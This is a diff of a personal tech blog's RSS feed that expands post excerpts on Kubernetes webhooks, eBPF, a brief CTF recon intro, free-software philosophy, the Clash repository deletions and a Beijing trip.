@@ -4,7 +4,7 @@
     <title>ch3n9w の 超元域</title>
     <link>https://ch3n9w.github.io/</link>
     <description>Recent content on ch3n9w の 超元域</description>
-    <generator>Hugo -- 0.131.0</generator>
+    <generator>Hugo -- 0.134.3</generator>
     <language>en-us</language>
     <lastBuildDate>Fri, 03 May 2024 17:14:14 +0800</lastBuildDate>
     <atom:link href="https://ch3n9w.github.io/index.xml" rel="self" type="application/rss+xml" />
@@ -13,12 +13,33 @@
       <link>https://ch3n9w.github.io/posts/tech-kubernetes-webhook/</link>
       <pubDate>Fri, 03 May 2024 17:14:14 +0800</pubDate>
       <guid>https://ch3n9w.github.io/posts/tech-kubernetes-webhook/</guid>
-      <description>Deployment and Debugging of Admission Webhook in Kubernetes cluster Intro Dynamic admission control 允许开发者添加自己的逻辑代码来对提交给API Server的对象进行修改和验证, 是非常强大的功能. 本文将部署一组demo admission webhook, 包括一个validating webhook 和一个 mutating webhook, 并介绍webhook的调试方法. 本文主要使用和参考了从0到1开发K8S_Webhook最佳实践, 并通过查阅官方文档对其中的一些不适应新版本k8s的内容进行了修正.
-本文使用的集群环境为Kubernetes v1.25.16, 使用minikube创建. 我所在的机器为Arch Linux. 代码仓库为 admission-webhook-example中的v1部分.
-在开始之前, 请确保集群的API Server开启了MutatingAdmissionWebhook和ValidatingAdmissionWebhook (一般默认情况下都开启了).
-Deployment 创建 service account 创建一个用于webhook的service account
-kubectl apply -f deployment/rbac.yaml 创建证书 API Server调用Webhook的过程是需要HTTPS通信的(其实集群内的通信几乎都是HTTPS), 因此需要为webhook创建证书来对webhook的service进行域名认证. 原博客使用的webhook-create-signed-cert.sh已经过时, 不再适用于1.25.16版本的集群了, 主要出问题的地方如下:
-# create server cert/key CSR and send to k8s API cat &amp;lt;&amp;lt;EOF | kubectl create -f - apiVersion: certificates.</description>
+      <description>&lt;h1 id=&#34;deployment-and-debugging-of-admission-webhook-in-kubernetes-cluster&#34;&gt;Deployment and Debugging of Admission Webhook in Kubernetes cluster&lt;/h1&gt;
+&lt;h2 id=&#34;intro&#34;&gt;Intro&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;uhttps://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllersrl&#34;&gt;Dynamic admission control&lt;/a&gt; 允许开发者添加自己的逻辑代码来对提交给API Server的对象进行修改和验证, 是非常强大的功能. 本文将部署一组demo admission webhook, 包括一个validating webhook 和一个 mutating webhook, 并介绍webhook的调试方法. 本文主要使用和参考了&lt;a href=&#34;https://zhuanlan.zhihu.com/p/404764407&#34;&gt;从0到1开发K8S_Webhook最佳实践&lt;/a&gt;, 并通过查阅官方文档对其中的一些不适应新版本k8s的内容进行了修正.&lt;/p&gt;
+&lt;p&gt;本文使用的集群环境为Kubernetes v1.25.16, 使用minikube创建. 我所在的机器为Arch Linux. 代码仓库为 &lt;a href=&#34;https://github.com/scriptwang/admission-webhook-example&#34;&gt;admission-webhook-example&lt;/a&gt;中的v1部分.&lt;/p&gt;
+&lt;p&gt;在开始之前, 请确保集群的API Server开启了MutatingAdmissionWebhook和ValidatingAdmissionWebhook (一般默认情况下都开启了).&lt;/p&gt;
+&lt;h2 id=&#34;deployment&#34;&gt;Deployment&lt;/h2&gt;
+&lt;h3 id=&#34;创建-service-account&#34;&gt;创建 service account&lt;/h3&gt;
+&lt;p&gt;创建一个用于webhook的service account&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl apply -f deployment/rbac.yaml
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;创建证书&#34;&gt;创建证书&lt;/h3&gt;
+&lt;p&gt;API Server调用Webhook的过程是需要HTTPS通信的(其实集群内的通信几乎都是HTTPS), 因此需要为webhook创建证书来对webhook的service进行域名认证. &lt;strong&gt;原博客使用的webhook-create-signed-cert.sh已经过时, 不再适用于1.25.16版本的集群了&lt;/strong&gt;, 主要出问题的地方如下:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# create  server cert/key CSR and  send to k8s API&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;&amp;lt;EOF | kubectl create -f -
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;apiVersion: certificates.k8s.io/v1beta1
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;kind: CertificateSigningRequest
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;metadata:
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  name: ${csrName}
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;spec:
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  groups:
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  - system:authenticated
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  request: $(cat ${tmpdir}/server.csr | base64 | tr -d &amp;#39;\n&amp;#39;)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  usages:
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  - digital signature
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  - key encipherment
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  - server auth
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;EOF&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;根据文档, 在1.22以及之后版本的kubernetes中, &lt;code&gt;certificates.k8s.io/v1beta1&lt;/code&gt; 已经被抛弃不可用, 需要修改为&lt;code&gt;certificates.k8s.io/v1&lt;/code&gt;, 并且需要在&lt;code&gt;spec&lt;/code&gt;中增加&lt;code&gt;signerName&lt;/code&gt;, signer的作用是签署证书. k8s内置的&lt;code&gt;signerName&lt;/code&gt; 有以下几种:&lt;/p&gt;</description>
     </item>
     <item>
       <title>CVE-2023-26484 Kubevirt 权限提升漏洞复现</title>
@@ -32,22 +53,25 @@ kubectl apply -f deployment/rbac.yaml 创建证书 API Server调用Webhook的过
       <link>https://ch3n9w.github.io/posts/read-free-opensource/</link>
       <pubDate>Sat, 23 Mar 2024 22:57:50 +0000</pubDate>
       <guid>https://ch3n9w.github.io/posts/read-free-opensource/</guid>
-      <description>借着&amp;quot;若为自由故&amp;quot;这本书, 读者可以更深刻地理解开源软件与自由软件的异同之处. 由于在实际情况中, 二者都开放了源代码, 大部分情况下也都会采用互相兼容甚至相同的协议, 因此其中的区别在越来越多人眼里逐渐模糊. 如今的软件行业, 大多数人在表达相同意思时更加倾向于使用&amp;quot;Open-source&amp;quot;而不是&amp;quot;Free&amp;quot;这个词, 不仅能够直观清晰地表达信息, 也能避免&amp;quot;Free&amp;quot;这个单词常用的&amp;quot;免费&amp;quot;之意 (为了人们认识到&amp;quot;Free software&amp;quot;中的Free不是免费而是自由的意思, Stallman 可强调了许多次, 但很遗憾, 大部分公司在听到他的强调前就会被吓跑). 但只要了解过自由软件和开源软件的历史, 就能发现其中差距并不在技术而是在道德层面上的分歧.
-具体来说, 开源运动更加注重软件开发方式的开放性, 一种类似于集市场景中人人可参与的, 以软件质量为最终目标的倡议, 它关注的是软件本身, 因此颇具工程师的纯粹特性; 相反, 自由软件运动不仅仅注重软件开发方式, 更赋予软件本身以道德属性, 它更强调软件用户的自由修改和自由传播的权利, 以&amp;quot;人的自由&amp;quot;为中心, 任何限制软件用户这些权利的个人和组织都是&amp;quot;邪恶&amp;quot;且需要被抵制的, 这让它更像是一种社会运动. 有一句Stallman的话可以很好地阐释其意: &amp;ldquo;如果一个软件是不自由的, 哪怕它的技术非常先进, 我也不会去使用它&amp;rdquo;, 相反, 开源运动的代表人物Linus曾经在一次大会上公开表示自己是Microsoft Powerpoint的粉丝用户, 二者的冲突也由此而来: 在开源主义者眼中, 商业软件是一个不完美的解决方案, 但是在自由软件者眼中, 商业软件则是彻头彻尾的敌人.
-两种运动并不是互相独立的, 相反, 开源运动脱胎于自由软件运动, 是后者为了适应软件行业商业发展的一种必然演变, 也是追求自由的理想主义者在现实屡屡碰壁后的一种妥协.
-在今天, 尽管Stallman依旧在全球各地对着众多慕名而来的听众布道, 他也依旧能给人以震撼人心开悟明智的感觉, 但这种感觉过后又有谁会真的去追随他的步伐, 去将自己生活中的所有专有软件清除呢? 要知道, Stallman的攻击目标, 可不仅仅是个人计算机中的专有软件, 任何非自由软件, 不管是汽车上的, 飞机上的, 动车上的, 乃至收音机里的, 都是他的抵制对象. 而对于没有资源的普通人来说, 单是找一台彻头彻尾源码可见(指主板上的固件)的笔记本电脑, 就已经是一件非常困难且完全没有性价比的事情了.
-从我的角度来看, 虽然很遗憾, 但是自开源运动成长起来后, 自由软件存在的意义就没有以前那么大了, 甚至说的不客气一些, 微乎其微.</description>
+      <description>&lt;p&gt;借着&amp;quot;若为自由故&amp;quot;这本书, 读者可以更深刻地理解开源软件与自由软件的异同之处. 由于在实际情况中, 二者都开放了源代码, 大部分情况下也都会采用互相兼容甚至相同的协议, 因此其中的区别在越来越多人眼里逐渐模糊. 如今的软件行业, 大多数人在表达相同意思时更加倾向于使用&amp;quot;Open-source&amp;quot;而不是&amp;quot;Free&amp;quot;这个词, 不仅能够直观清晰地表达信息, 也能避免&amp;quot;Free&amp;quot;这个单词常用的&amp;quot;免费&amp;quot;之意 (为了人们认识到&amp;quot;Free software&amp;quot;中的Free不是免费而是自由的意思, Stallman 可强调了许多次, 但很遗憾, 大部分公司在听到他的强调前就会被吓跑). 但只要了解过自由软件和开源软件的历史, 就能发现其中差距并不在技术而是在道德层面上的分歧.&lt;/p&gt;
+&lt;p&gt;具体来说, 开源运动更加注重软件开发方式的开放性, 一种类似于集市场景中人人可参与的, 以软件质量为最终目标的倡议, 它关注的是软件本身, 因此颇具工程师的纯粹特性; 相反, 自由软件运动不仅仅注重软件开发方式, 更赋予软件本身以道德属性, 它更强调软件用户的自由修改和自由传播的权利, 以&amp;quot;人的自由&amp;quot;为中心, 任何限制软件用户这些权利的个人和组织都是&amp;quot;邪恶&amp;quot;且需要被抵制的, 这让它更像是一种社会运动. 有一句Stallman的话可以很好地阐释其意: &amp;ldquo;如果一个软件是不自由的, 哪怕它的技术非常先进, 我也不会去使用它&amp;rdquo;, 相反, 开源运动的代表人物Linus曾经在一次大会上公开表示自己是Microsoft Powerpoint的粉丝用户, 二者的冲突也由此而来: 在开源主义者眼中, 商业软件是一个不完美的解决方案, 但是在自由软件者眼中, 商业软件则是彻头彻尾的敌人.&lt;/p&gt;
+&lt;p&gt;两种运动并不是互相独立的, 相反, 开源运动脱胎于自由软件运动, 是后者为了适应软件行业商业发展的一种必然演变, 也是追求自由的理想主义者在现实屡屡碰壁后的一种妥协.&lt;/p&gt;
+&lt;p&gt;在今天, 尽管Stallman依旧在全球各地对着众多慕名而来的听众布道, 他也依旧能给人以震撼人心开悟明智的感觉, 但这种感觉过后又有谁会真的去追随他的步伐, 去将自己生活中的所有专有软件清除呢? 要知道, Stallman的攻击目标, 可不仅仅是个人计算机中的专有软件, 任何非自由软件, 不管是汽车上的, 飞机上的, 动车上的, 乃至收音机里的, 都是他的抵制对象. 而对于没有资源的普通人来说, 单是找一台彻头彻尾源码可见(指主板上的固件)的笔记本电脑, 就已经是一件非常困难且完全没有性价比的事情了.&lt;/p&gt;
+&lt;p&gt;从我的角度来看, 虽然很遗憾, 但是自开源运动成长起来后, 自由软件存在的意义就没有以前那么大了, 甚至说的不客气一些, 微乎其微. 这是需要联系历史背景来看的, 在自由软件运动诞生的那个年代, 软件行业极度闭塞, 互联网才刚刚诞生, 各个公司都在自己蒙头闭门造车, 极尽所能保护自家的代码不被公开, 相互之间更不用说有什么兼容合作了. 自由软件的诞生是对那个封闭环境的一种彻头彻尾的反叛, 它以一种偏激的姿态在软件行业逐渐打动了一批人, 也培养起了别具一格更加开放的文化.&lt;/p&gt;</description>
     </item>
     <item>
       <title>k8s lan party</title>
       <link>https://ch3n9w.github.io/posts/ctf-k8s-lan-party/</link>
       <pubDate>Fri, 15 Mar 2024 07:34:46 +0000</pubDate>
       <guid>https://ch3n9w.github.io/posts/ctf-k8s-lan-party/</guid>
-      <description>Long time no CTF~~
-RECON Just check the environment related to K8s using env and reconnoiter internal service using dnscan
-This blog is good written link
-Finding Neighbours According to the description, the sidecar container of current pod is sending some information (possibly flag) to remote server. So, the first step is digging the remote server like what we do in the first challenge, which leads me to reporting-service.k8s-lan-party.svc.cluster.local.
-As we all know, all containers within same pod share one network namespace, which means we can sniff the traffic from our current container.</description>
+      <description>&lt;p&gt;Long time no CTF~~&lt;/p&gt;
+&lt;h2 id=&#34;recon&#34;&gt;RECON&lt;/h2&gt;
+&lt;p&gt;Just check the environment related to K8s using &lt;code&gt;env&lt;/code&gt; and reconnoiter internal service using &lt;code&gt;dnscan&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;recon.png&#34; alt=&#34;recon&#34;  /&gt;
+&lt;/p&gt;
+&lt;p&gt;This blog is good written &lt;a href=&#34;https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html&#34;&gt;link&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;finding-neighbours&#34;&gt;Finding Neighbours&lt;/h2&gt;
+&lt;p&gt;According to the description, the sidecar container of current pod is sending some information (possibly flag) to remote server. So, the first step is digging the remote server like what we do in the first challenge, which leads me to &lt;code&gt;reporting-service.k8s-lan-party.svc.cluster.local&lt;/code&gt;.&lt;/p&gt;</description>
     </item>
     <item>
       <title>2023年度总结</title>
@@ -63,62 +87,100 @@ As we all know, all containers within same pod share one network namespace, whic
       <link>https://ch3n9w.github.io/posts/tech-learning-ebpf/</link>
       <pubDate>Sun, 04 Feb 2024 00:06:15 +0000</pubDate>
       <guid>https://ch3n9w.github.io/posts/tech-learning-ebpf/</guid>
-      <description>eBPF 是一项革命性的技术, 起源于Linux 内核, 它可以在特权上下文中(如操作系统内核)运行沙盒程序. 它用于安全有效地扩展内核的功能, 而无需通过更改内核源代码或加载内核模块的方式来实现. 从历史上看,由于内核具有监督和控制整个系统的特权,操作系统一直是实现可观测性, 安全性和网络功能的理想场所.
-对ebpf慕名许久, 正好趁寒假拜读一下Learning eBPF, 虽然是基于略过时的框架bcc, 但是在这个过程中学到的知识想必依旧可以迁移到别的框架去.
-Background and pre-knowledge bcc bcc的ebpf c代码不是真正的C, 而是bcc自己定义的一种和C类似的语言.
-limitation of ebpf program eBPF 程序必须被验证器校验通过后才能执行，且不能包含无法到达的指令； eBPF 程序不能随意调用内核函数，只能调用在 API 中定义的辅助函数； eBPF 程序栈空间最多只有 512 字节，想要更大的存储，就必须要借助映射存储； 在内核 5.2 之前，eBPF 字节码最多只支持 4096 条指令，而 5.2 内核把这个限制提高到了 100 万条； 由于内核的快速变化，在不同版本内核中运行时，需要访问内核数据结构的 eBPF 程序很可能需要调整源码，并重新编译。 tracepoint and kprobe tracepoint其实就是在Linux内核的一些关键函数中埋下的hook点,这样在tracing的时候,我们就可以在这些固定的点上挂载调试的函数,然后查看内核的信息.
-Tracepoint是在内核中固定的hook点, 并不是在所有的函数中都有tracepoint. 这时候, 我们就需要用到kprobe了. kprobe可以动态地在所有的内核函数(除了inline函数)上挂载probe函数
-eBPF virtual machine The ebpf virtual machine uses 10 general-purpose registers (0-9), and additional register 10 which was used as a stack frame pointer (can only be read but not written).</description>
+      <description>&lt;p&gt;eBPF 是一项革命性的技术, 起源于Linux 内核, 它可以在特权上下文中(如操作系统内核)运行沙盒程序. 它用于安全有效地扩展内核的功能, 而无需通过更改内核源代码或加载内核模块的方式来实现. 从历史上看,由于内核具有监督和控制整个系统的特权,操作系统一直是实现可观测性, 安全性和网络功能的理想场所.&lt;/p&gt;
+&lt;p&gt;对ebpf慕名许久, 正好趁寒假拜读一下Learning eBPF, 虽然是基于略过时的框架bcc, 但是在这个过程中学到的知识想必依旧可以迁移到别的框架去.&lt;/p&gt;
+&lt;h2 id=&#34;background-and-pre-knowledge&#34;&gt;Background and pre-knowledge&lt;/h2&gt;
+&lt;h3 id=&#34;bcc&#34;&gt;bcc&lt;/h3&gt;
+&lt;p&gt;bcc的ebpf c代码不是真正的C, 而是bcc自己定义的一种和C类似的语言.&lt;/p&gt;
+&lt;h3 id=&#34;limitation-of-ebpf-program&#34;&gt;limitation of ebpf program&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;eBPF 程序必须被验证器校验通过后才能执行，且不能包含无法到达的指令；&lt;/li&gt;
+&lt;li&gt;eBPF 程序不能随意调用内核函数，只能调用在 API 中定义的辅助函数；&lt;/li&gt;
+&lt;li&gt;eBPF 程序栈空间最多只有 512 字节，想要更大的存储，就必须要借助映射存储；&lt;/li&gt;
+&lt;li&gt;在内核 5.2 之前，eBPF 字节码最多只支持 4096 条指令，而 5.2 内核把这个限制提高到了 100 万条；&lt;/li&gt;
+&lt;li&gt;由于内核的快速变化，在不同版本内核中运行时，需要访问内核数据结构的 eBPF 程序很可能需要调整源码，并重新编译。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;tracepoint-and-kprobe&#34;&gt;tracepoint and kprobe&lt;/h3&gt;
+&lt;p&gt;tracepoint其实就是在Linux内核的一些关键函数中埋下的hook点,这样在tracing的时候,我们就可以在这些固定的点上挂载调试的函数,然后查看内核的信息.&lt;/p&gt;
+&lt;p&gt;Tracepoint是在内核中固定的hook点, 并不是在所有的函数中都有tracepoint. 这时候, 我们就需要用到kprobe了. kprobe可以动态地在所有的内核函数(除了inline函数)上挂载probe函数&lt;/p&gt;
+&lt;h3 id=&#34;ebpf-virtual-machine&#34;&gt;eBPF virtual machine&lt;/h3&gt;
+&lt;p&gt;The ebpf virtual machine uses 10 general-purpose registers (0-9), and additional register 10 which was used as a stack frame pointer (can only be read but not written). As a BPF program is executed, &lt;strong&gt;values get stored in these registers to keep track of state.&lt;/strong&gt;&lt;/p&gt;</description>
     </item>
     <item>
       <title>RIP Clash</title>
       <link>https://ch3n9w.github.io/posts/gossip-rip-clash/</link>
       <pubDate>Sat, 04 Nov 2023 10:13:59 +0000</pubDate>
       <guid>https://ch3n9w.github.io/posts/gossip-rip-clash/</guid>
-      <description>2023年11初,简中互联网又发生了一出闹剧,不过于以往的过眼云烟所不同的是,这次的事件导致了一系列优秀开源软件的消亡.
-起因 事件的经过其实并不复杂.11.2,clash for windows 的作者删除了github上用于发布的仓库中的信息,并在个人telegram频道上宣布不再开发.由于cfw的操作简单,对小白友好,因此其用户数量相当之大.删库的消息出来后,网友们纷纷开始关注作者的社交账号,对是否因信息泄露导致被抓加以猜测.其实对于一个网络代理软件来说,无论是因为被请喝茶还是因为作者不想干了而删库都是一件很正常的事情.
-如果事情仅仅到这里就结束,那么大家顶多也就感慨一句过去说烂了的那些话,甚至对于开源主义者来说连感慨都没有,因为cfw本身就是一个闭源软件,而github仅仅是用来发布二进制包的.
-但是事情没有那么简单.
-clash for windows是基于开源的clash core核心代码做的图形化客户端工具,而该核心代码同样是一系列类似软件（例如clash x, clash meta）的基础组件.或许是出于对clash core作者的尊重,这些项目的名称中也都包含了clash字样.
-通常情况下,开发者并不会在意自己的软件被普通用户和其他clash相关软件搞混.而对于cfw用户,尤其是其中的小白用户来说,他们中的大部分仅仅接触过cfw,因此在口口相传中会自然而然地将clash这个有特征的词作为clash for windows的指代以节约沟通成本,cfw是clash, clash是cfw.
-因此,cfw被删库后,消息通过互联网在用户群体之间开始广泛传播开来,很快就演变为了下面这张图上的消息.
-假消息只是第一步.对于大部分cfw的用户来说,他们似乎并不知道此种软件的敏感程度和软件作者所面临的风险,他们只是在盲目地在各大社交媒体上发问,而很遗憾却也意料之中的,这其中,包括了微博.
-前面提到,cfw的低门槛为它带来了众多的用户,而现在,这些用户将成为压死所有clash相关项目的稻草.由于提问和吃瓜的人太多,相关话题的热度不断上升,该话题很快出现在了微博的热搜上.
-于是事情失控了.
-结果 11月3号,出于对自身安全的考虑,几乎所有clash相关软件作者,包括clash内核项目作者,集体将代码库删除.一个持续了数年,帮助到许多网民的软件,却因为网民们的无知,在一天之间内尽数消亡.整个过程实在太快,快得根本不像有关部门的有组织行动.因为驱使项目消亡的,仅仅只是网民们的狂欢,和开源作者们的恐惧.
-而可悲的是,在删库时间结束后,clash在微博的话题热度更高了,是的,没有人关心项目作者是否会因为这场风波而被捕入狱,他们只想四处打听,吃瓜,并迫切地希望看到血流成河. 一直到现在, 有关话题在telegram上还在被持续不断的争论中, 其中跳出了一些人来试图通过捏造事实抹黑多位作者来洗脱自身的责任.
-可笑的是,当被要求放出对应的项目时,此人开始转移话题,并且在他臆想的情况下,对作者进行了人身攻击.
-可悲的是,这种人在这场风波中并不少见,他们不仅仅是无知,更是无耻.
-教训 其实单纯责怪用户并没有什么意义,毕竟像cfw这样方便的软件,其用户群体是鱼龙混杂的,要求他们集体提升相关的意识也是不现实的,所以很遗憾,尽管我们可以斥责部分的微博用户,但是归根到底,如何改变此类软件尤其是开源软件的危险现状,作者该做出什么样的改变来更好地保护自己,才是更有现实意义的话题.
-具体来说, 对我而言, 除非开源软件合法合规,否则:
-不要做windows平台下的软件 不要在项目中包含简体中文说明 不要取朗朗上口好记的项目名 控制推广范围,就是对作者最大的保护 尽管以上措施会限制软件的使用范围,但是对于此类软件来说,开发者的人身安全才是第一位的.
-只是,这些教训,对于已经消亡的项目来说,已经太迟了.
-参考 https://github.com/net4people/bbs/issues/303 https://www.eaimty.com/2023/opensource-project-based-on-hormone/</description>
+      <description>&lt;p&gt;2023年11初,简中互联网又发生了一出闹剧,不过于以往的过眼云烟所不同的是,这次的事件导致了一系列优秀开源软件的消亡.&lt;/p&gt;
+&lt;h2 id=&#34;起因&#34;&gt;起因&lt;/h2&gt;
+&lt;p&gt;事件的经过其实并不复杂.11.2,clash for windows 的作者删除了github上用于发布的仓库中的信息,并在个人telegram频道上宣布不再开发.由于cfw的操作简单,对小白友好,因此其用户数量相当之大.删库的消息出来后,网友们纷纷开始关注作者的社交账号,对是否因信息泄露导致被抓加以猜测.其实对于一个网络代理软件来说,无论是因为被请喝茶还是因为作者不想干了而删库都是一件很正常的事情.&lt;/p&gt;
+&lt;p&gt;如果事情仅仅到这里就结束,那么大家顶多也就感慨一句过去说烂了的那些话,甚至对于开源主义者来说连感慨都没有,因为cfw本身就是一个闭源软件,而github仅仅是用来发布二进制包的.&lt;/p&gt;
+&lt;p&gt;但是事情没有那么简单.&lt;/p&gt;
+&lt;p&gt;clash for windows是基于开源的clash core核心代码做的图形化客户端工具,而该核心代码同样是一系列类似软件（例如clash x, clash meta）的基础组件.或许是出于对clash core作者的尊重,这些项目的名称中也都包含了clash字样.&lt;/p&gt;
+&lt;p&gt;通常情况下,开发者并不会在意自己的软件被普通用户和其他clash相关软件搞混.而对于cfw用户,尤其是其中的小白用户来说,他们中的大部分仅仅接触过cfw,因此在口口相传中会自然而然地将clash这个有特征的词作为clash for windows的指代以节约沟通成本,cfw是clash, clash是cfw.&lt;/p&gt;
+&lt;p&gt;因此,cfw被删库后,消息通过互联网在用户群体之间开始广泛传播开来,很快就演变为了下面这张图上的消息.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;photo_2023-11-04_10-17-56.jpg&#34; alt=&#34;&#34;  /&gt;
+&lt;/p&gt;
+&lt;p&gt;假消息只是第一步.对于大部分cfw的用户来说,他们似乎并不知道此种软件的敏感程度和软件作者所面临的风险,他们只是在盲目地在各大社交媒体上发问,而很遗憾却也意料之中的,这其中,包括了微博.&lt;/p&gt;
+&lt;p&gt;前面提到,cfw的低门槛为它带来了众多的用户,而现在,这些用户将成为压死所有clash相关项目的稻草.由于提问和吃瓜的人太多,相关话题的热度不断上升,该话题很快出现在了微博的热搜上.&lt;/p&gt;
+&lt;p&gt;于是事情失控了.&lt;/p&gt;
+&lt;h2 id=&#34;结果&#34;&gt;结果&lt;/h2&gt;
+&lt;p&gt;11月3号,出于对自身安全的考虑,几乎所有clash相关软件作者,包括clash内核项目作者,集体将代码库删除.一个持续了数年,帮助到许多网民的软件,却因为网民们的无知,在一天之间内尽数消亡.整个过程实在太快,快得根本不像有关部门的有组织行动.因为驱使项目消亡的,仅仅只是网民们的狂欢,和开源作者们的恐惧.&lt;/p&gt;
+&lt;p&gt;而可悲的是,在删库时间结束后,clash在微博的话题热度更高了,是的,没有人关心项目作者是否会因为这场风波而被捕入狱,他们只想四处打听,吃瓜,并迫切地希望看到血流成河. 一直到现在, 有关话题在telegram上还在被持续不断的争论中, 其中跳出了一些人来试图通过捏造事实抹黑多位作者来洗脱自身的责任.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;normal.png&#34; alt=&#34;&#34;  /&gt;
+&lt;/p&gt;
+&lt;p&gt;可笑的是,当被要求放出对应的项目时,此人开始转移话题,并且在他臆想的情况下,对作者进行了人身攻击.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;attack.png&#34; alt=&#34;&#34;  /&gt;
+&lt;/p&gt;
+&lt;p&gt;可悲的是,这种人在这场风波中并不少见,他们不仅仅是无知,更是无耻.&lt;/p&gt;
+&lt;h2 id=&#34;教训&#34;&gt;教训&lt;/h2&gt;
+&lt;p&gt;其实单纯责怪用户并没有什么意义,毕竟像cfw这样方便的软件,其用户群体是鱼龙混杂的,要求他们集体提升相关的意识也是不现实的,所以很遗憾,尽管我们可以斥责部分的微博用户,但是归根到底,如何改变此类软件尤其是开源软件的危险现状,作者该做出什么样的改变来更好地保护自己,才是更有现实意义的话题.&lt;/p&gt;
+&lt;p&gt;具体来说, 对我而言, 除非开源软件合法合规,否则:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;不要做windows平台下的软件&lt;/li&gt;
+&lt;li&gt;不要在项目中包含简体中文说明&lt;/li&gt;
+&lt;li&gt;不要取朗朗上口好记的项目名&lt;/li&gt;
+&lt;li&gt;控制推广范围,就是对作者最大的保护&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;尽管以上措施会限制软件的使用范围,但是对于此类软件来说,开发者的人身安全才是第一位的.&lt;/p&gt;
+&lt;p&gt;只是,这些教训,对于已经消亡的项目来说,已经太迟了.&lt;/p&gt;
+&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/net4people/bbs/issues/303&#34;&gt;https://github.com/net4people/bbs/issues/303&lt;/a&gt;
+&lt;a href=&#34;https://www.eaimty.com/2023/opensource-project-based-on-hormone/&#34;&gt;https://www.eaimty.com/2023/opensource-project-based-on-hormone/&lt;/a&gt;&lt;/p&gt;</description>
     </item>
     <item>
       <title>2023 记北京秋游</title>
       <link>https://ch3n9w.github.io/posts/gossip-beijing-travel-2023-2/</link>
       <pubDate>Mon, 30 Oct 2023 21:35:04 +0000</pubDate>
       <guid>https://ch3n9w.github.io/posts/gossip-beijing-travel-2023-2/</guid>
-      <description>与所爱之人在一起的时光, 会生出互相的珍惜, 这份珍惜犹如风筝线一般, 即便对方远在云端, 依旧可以感知到其心念所动, 于是思念由此而生.
-在yq成功上岸家乡的教师编后, 为了庆祝, 也为了缓解许久未见的相思之苦, 我匆忙计划了一下行程, 一边让她订来北京的车票, 一边思考附近哪里有卖香槟的.
